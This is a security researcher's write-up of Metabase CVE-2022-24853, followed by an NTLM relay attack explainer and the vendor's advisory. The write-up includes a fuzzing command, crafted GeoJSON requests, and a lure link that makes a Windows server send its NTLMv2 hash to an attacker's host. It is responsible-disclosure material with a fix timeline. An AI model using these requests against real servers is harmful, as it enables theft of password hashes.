# NTLM Attack in Metabase CVE-2022-24853

Posted: [14. Februar 2022](https://secure77.de/metabase-ntlm-relay-attack/ "20:56") *by* [secure77](https://secure77.de/author/blogadminsecure77/ "Beiträge von secure77")

## Metabase GeoJSON API Endpoint

Back in September 2021, [Metabase](https://www.metabase.com/) released a security announcement regarding its GeoJSON API endpoint: [GeoJSON URL validation can expose server files and environment variables to unauthorized users](https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr)

> We’ve discovered a potential security issue with the [custom GeoJSON map](https://www.metabase.com/docs/latest/administration-guide/20-custom-maps.html) (admin->settings->maps->custom maps->add a map) support and potential local file inclusion (including environment variables). This issue is fixed in a new maintenance release (1.40.5). Only versions 1.40.0-1.40.4 are affected.

Curious about this issue, I downloaded the newly released version 0.40.5 and started looking at this API endpoint.

Of course you need to provide a valid admin cookie to pass the authentication filter introduced with this new version. But maybe there is still something to find.

I created an admin account and started fuzzing the API Endpoint `/api/geojson?url=`

And after trying different special chars and characters I found a strange behavior when you pass different URL schemes.

```
ffuf -u 'http://<metbaseURL>:3000/api/geojson?url=FUZZ://attacker' -w /usr/share/seclists/Miscellaneous/schemes.txt -H 'Cookie: metabase.DEVICE=<device>; metabase.SESSION=<session>' -fw 65 -mc all
```
[![](https://secure77.de/wp-content/uploads/2021/12/image.png)](https://secure77.de/wp-content/uploads/2021/12/image.png)

Looking at these URL schemes deeper we can recognize some special behavior between them.

1. HTTP, HTTPS works as designed

```
GET /api/geojson?url=http://<attacker> HTTP/1.1
Host: localhost:3000
```

response:

```
GeoJSON URL failed to load
```

2. File, mailto and FTP responses with the following

```
Invalid GeoJSON file location: must either start with http:// or https:// or be a relative path to a file on the classpath. URLs referring to hosts that supply internal hosting metadata are prohibited.
```

3. coaps+tcp etc. or chunk schemes and also JAR was interesting, because they give me a detailed stack trace

[![](https://secure77.de/wp-content/uploads/2021/12/image-1-1024x643.png)](https://secure77.de/wp-content/uploads/2021/12/image-1.png)
[![](https://secure77.de/wp-content/uploads/2021/12/image-9.png)](https://secure77.de/wp-content/uploads/2021/12/image-9.png)

I found a difference between chunk and JAR requests, which points me to further investigations.

## JAR URL Handler

so sending a request like this

```
GET /api/geojson?url=jar://<attacker> HTTP/1.1
Host: localhost:3000
```

will trigger the following response

[![](https://secure77.de/wp-content/uploads/2021/12/image-2-1024x733.png)](https://secure77.de/wp-content/uploads/2021/12/image-2.png)

it seems that Metabase passes the URL still to the java.net.URL handler. So this is a parser differential issue.

providing the missing !/ in the URL leads to this error message

[![](https://secure77.de/wp-content/uploads/2021/12/image-3-1024x168.png)](https://secure77.de/wp-content/uploads/2021/12/image-3.png)

So something happens here. I tried various things and my goal was to bypass the filter to get file read access on the server.

After some time and various tries I figured out how to create a URL that doesn’t trigger the stack trace and run through.

[![](https://secure77.de/wp-content/uploads/2021/12/image-4-1024x476.png)](https://secure77.de/wp-content/uploads/2021/12/image-4.png)

Although the response does not print the contents of the file, with Procom I could proof that file access still occurs on the server.

[![](https://secure77.de/wp-content/uploads/2021/12/image-5-1024x288.png)](https://secure77.de/wp-content/uploads/2021/12/image-5.png)

So this was a first confirmation that you can bypass the implemented „file“ filter. However, if the file content is not printed in the response, then this is useless. So my next thought was, if I can’t „read“ local files, maybe I can read remote files. There are many java deserialization attacks, if Metabase tries to read and execute jar files maybe there is a way to exploit it.

So I set up a responder and tried to receive anything on my remote VM

## NTLM Reflection Attack

Since I was testing from a Windows box, I surprisingly realized that the file schema allowed me to get the Windows NTLMv2 hash from the Metabase Server.

So sending this:

```
GET /api/geojson?url=jar:file:\\<attacker>\test.txt!/ HTTP/1.1
Host: localhost:3000
```
[![](https://secure77.de/wp-content/uploads/2021/12/image-6-1024x536.png)](https://secure77.de/wp-content/uploads/2021/12/image-6.png)

will give us the hash for the user as Metabase is running

[![](https://secure77.de/wp-content/uploads/2021/12/image-7-1024x113.png)](https://secure77.de/wp-content/uploads/2021/12/image-7.png)

I researched about this Java NTLM topic and found a interesting BlackHat presentation from 2019: <https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf>

There could be more vulnerabilities, but at this point I decided to stop my research and report this issue to Metabase. They responded immediately, very gratefully, and promised to fix this vulnerability.

## Conclusion

Take the vectors together, this exploit is only possible if

* Metabase runs on a Windows System
* The API call is executed by someone who have admin privileges in Metabase

But as the API call is just a GET request, the attack vector is more trivial as soon you can lure a logged in metabase admin to click your malicious link.

So a simple click to this link can lead to a password hash steal:

`http://metabase-target-server.com/api/geojson?url=jar:file:\<attacker-ip>\test.txt!/`

## Fix and Timeline

* October 12, 2021: I reported the issue to Metabase through security@metabase.com
* October 12, 2021: Immediately response from Metabase, that they are planning to remove this endpoint completely
* December 13, 2021: Mail from Metabase about release of the Version v41.4 where this should be fixed and if I can double check this
* December 13, 2021: Retest from my site and mail to Metabase, that this vulnerability still exists and is not fixed by the latest release, including a more detailed description for reproducing
* December 13, 2021: Confirmation from Metabase, that this can be reproduced and they are working on a fix
* Januar 24, 2022: Release of (rc) Version v42, where this should be fixed
* Februar 1, 2022: Retest and confirmed that it is fixed
* April 14, 2022: Release of the security advisory [Make GeoJSON URL read fully conditional on validation](https://github.com/metabase/metabase/security/advisories/GHSA-5cfq-582c-c38m) and [CVE-2022-24853](https://nvd.nist.gov/vuln/detail/CVE-2022-24853)

> Metabase has a proxy to load arbitrary URLs for JSON maps as part of our GeoJSON support. While we do validation to not return contents of arbitrary URLs, there is a case where a particularly crafted request could result in file access on windows, which allows enabling an [NTLM relay attack](https://www.qomplx.com/qomplx-knowledge-ntlm-relay-attacks-explained/), potentially allowing an attacker to receive the password hash.

# QOMPLX Knowledge: NTLM Relay Attacks Explained

![QOMPLX Knowledge: NTLM Relay Attacks Explained](/content/images/2020/08/AdobeStock_320943598.jpg)

*This is the latest in our “QOMPLX Knowledge” series. These posts are intended to provide basic information and insights about the attack activity and trends that are driving malicious campaigns and that QOMPLX researchers encounter in our forensic work with customers.*

---

Each security incident and data breach is unique—a singular combination of vulnerable and misconfigured systems, compromised assets, attacker motivations and chance. But when you talk with security experts about the “whys” of security incidents these days, a familiar acronym pops up: NTLM. That stands for NT LAN Manager, a security protocol that is in its third decade of existence and that has worked its way deep into enterprise networks. The persistence of NTLM and the difficulty organizations have had jettisoning it has contributed to a long-running trend of data breaches as attackers leverage targeted- as well as trivial and automated attacks to put critical systems at risk.

Despite its many security weaknesses, NTLM is still supported by many legacy systems and applications. More than 20 years after the introduction of NTLM's "replacement" (Kerberos), backwards compatibility with the legacy Windows systems and applications has kept NTLM in the fold, adding complexity and weakness to Active Directory implementations in particular.

One of the biggest sources of compromises are so-called NTLM “replay” attacks in which an attacker positions themselves between clients and servers that are doing NTLM authentication, capturing credentials and facilitating lateral movement by replaying legitimate credentials on other servers.

## Key Points

* NTLM relay attacks allow attackers to sit between clients and servers and relay validated authentication requests in order to access network services
* Unlike NTLM, a challenge-response protocol, Kerberos’ mutual authentication is considered more secure and has been the de facto standard in Windows since Windows 2000
* Microsoft recommends a number of mitigations for NTLM relay attacks, including SMB and LDAP signing, and EPA,
* The best fix for NTLM insecurity is to stop using NTLM within an organization and for NTLM to be deprecated

## What is NTLM?

NTLM is a Microsoft proprietary authentication protocol and it was standard in early Windows server systems through Windows 2000, when Kerberos became its de facto successor and is still the standard for authentication in Windows systems.

First introduced in the 1990s, NTLM replaced Microsoft’s older LAN Manager (LANMAN). NTLM is a challenge-response authentication protocol which uses a series of three messages to authenticate a client. The NTLM protocol uses the RC4 algorithm for encryption. It uses one or both of two un-salted hashed password values which are stored on the client and the server (or domain controller). NTLM uses two hashing algorithms: the LM Hash (a DES-based function applied to the first 14 chars of the password converted to the traditional 8 bit PC charset for the language) and the NT Hash (an MD4 of the little endian UTF-16 Unicode password). Both hash values are 16 bytes (128 bits) each.

NTLM is vulnerable for a number of reasons. First and foremost, because it does not support modern cryptographic methods such as AES or SHA-256. That makes it vulnerable to offline cracking attacks using tools such as HashCat. Also, NTLM’s hash values can be matched up with alphanumeric passwords using so-called “[rainbow tables](https://en.wikipedia.org/wiki/Rainbow_table?ref=qomplx.com)” of passwords and hashes compiled from previous data leaks. Particularities about how NTLM creates password hashes combined with the use of rainbow tables and distributed computing systems mean that NTLM hashes for passwords of any length can be cracked in minutes to hours - and at little cost to attackers.

Even without a rainbow table, hashes can be used in lieu of actual alphanumeric passwords as part of so-called “Pass the Hash” attacks. In other words: attackers who steal NTLM password hashes can authenticate to network resources without knowing the actual password from which the hash was created. Microsoft and other tech giants long ago mandated that vendors and IT organizations deprecate RC4, SHA-1, and other weak algorithms. Despite this, NTLM is still used for local authentication on Windows systems and storage of Windows passwords on Active Directory Domain Controllers.

## What are NTLM Relay Attacks?

In NTLM, a challenge-response protocol is used for authentication. For any authentication request:

1. NTLM establishes a three-way handshake during client-server authentication with the client establishing a path to the server and negotiating authentication.
2. The server responds to the client’s negotiation message with a challenge, asking the client to encrypt a sequence of characters using a secret it possesses: a hash of its password.
3. The client sends a response to the server, which contacts a domain authentication service hosted on a domain controller to verify the response.

In a NTLM relay attack, an attacker establishes a position between the client and server on the network and intercepts authentication traffic. Client authentication requests are forwarded to the server by the attacker, similarly challenges are relayed to the client and valid authentication responses to the challenge from the client are sent back to the server, allowing the attacker—rather than the client—to authenticate using the client’s credentials.

In relay attacks, the client believes it is negotiating with the target server it wants to authenticate to. The server, meanwhile, believes that the attacker is a legitimate client attempting to authenticate.

This risk of relay attacks was amplified in October 2019, when Microsoft [patched two critical vulnerabilities in all versions of NTLM](https://www.bleepingcomputer.com/news/security/new-microsoft-ntlm-flaws-may-allow-full-domain-compromise/?ref=qomplx.com). Successful exploits could allow an attacker to remotely run code on a Windows machine, or move laterally on the network to critical systems such as servers hosting domain controllers. One vulnerability allows attackers to bypass Message Integrity Code (MIC), a protection implemented by Microsoft that ensures messages sent over a network have not been tampered with.

The bypass can be used in NTLM relay attacks to fool servers into not enforcing signing during authentication negotiations. The second flaw also allows for bypasses of MIC and can be abused during NTLM relay attacks to authenticate to Active Directory Federation Services and potentially access user credentials.

## Mitigations and Protections From NTLM Relay Attacks

There are a number of work arounds and changes that can remove the risk of NTLM relay attacks.

### Use Kerberos

The biggest step organizations can take to eliminate the threat of NTLM relay attacks is to stop using NTLM. Kerberos, a byproduct of MIT’s Project Athena, has been Microsoft’s preferred replacement for NTLM since the release of the Windows 2000 platform. In contrast to NTLM, Kerberos uses mutual authentication between the client and server rather than NTLM’s challenge-response. Clients must be part of a domain and have access to a domain controller in order to attempt authentication. With NTLM, clients contact the server, which then contacts the domain controller.

Using Kerberos, client authentication begins with communication to an authentication server which then contacts a Kerberos key distribution center that issues a ticket granting ticket (TGT) encrypted with the ticket granting service’s secret. As the client needs access to network services and resources, the TGT is passed along and a request is made to access the service. Once the TGT is verified, session tickets are issued to the client, which now has access to the service.

Kerberos has been a fixture in Windows Server for two decades and is more secure than NTLM, which suffers from a number of native vulnerabilities, including a lack of server authentication and weak cryptography, in addition to slower performance compared to Kerberos.

### Patch & Update Configurations to Mitigate Relay Attacks

Microsoft recommends running all systems at current patch levels and that organizations ensure that a number of specific configurations are secure, including:

* Turning on SMB signings to blunt NTLM relay attacks
* Enforcing LDAP signing and LDAPS channel binding on domain controllers
* Enabling Enhanced Protection for Authentication to mitigate NTLM relay attacks on ADFS and web servers
* Configure ADFS and web servers to accept only requests where EPA is turned on

### Instrument and Validate Kerberos and Active Directory

Technologies such as Kerberos need to be fully instrumented and monitored to prevent a wide range of other popular attacks including Golden- and Silver Ticket attacks. [QOMPLX’s Q:Cyber Identity Assurance](https://www.qomplx.com/cyber/) can help organizations do just that. It maintains a real-time stateful ledger of all appropriately issued and valid Kerberos tickets and observes Kerberos interactions across clients (principals), domain controllers (key distribution centers) and Kerberized services.

Finally, as Active Directory attacks become more common external validation of the Kerberos protocol becomes essential to assure IT teams that every ticket presented by a Kerberos service client was in fact issued by a legitimate key distribution center. QOMPLX’s technology can verify, in near real-time, that a given Kerberos authentication event was correctly generated and that it is linked to legitimate user interactions and the issuing domain controller. This type of deterministic verification makes it difficult for attackers to abuse authentication protocols and processes.

# Make GeoJSON URL read fully conditional on validation

Low

[diogormendes](/diogormendes)
published
GHSA-5cfq-582c-c38m
Apr 14, 2022

## Package

Metabase OSS and Enterprise
(Metabase)

## Affected versions

<x.42.3 <x.41.6, <x.40.7

## Patched versions

0.42.4,1.42.4,0.41.7,1.41.7,0.40.8,1.40.8

## Description

### Impact

Metabase has a proxy to load arbitrary URLs for JSON maps as part of our GeoJSON support. While we do validation to not return contents of arbitrary URLs, there is a case where a particularly crafted request could result in file access on windows, which allows enabling an [NTLM relay attack](https://www.qomplx.com/qomplx-knowledge-ntlm-relay-attacks-explained/), potentially allowing an attacker to receive the password hash.

### Patches

The following patches (or greater versions) are available:

* 0.42.4 and 1.42.4
* 0.41.7 and 1.41.7
* 0.40.8 and 1.40.8

If you use host Metabase in a Windows environment, then it's advised to upgrade.

All releases are available on <https://github.com/metabase/metabase/releases>

### Credits

Reported by <https://github.com/secure-77> via security@ email
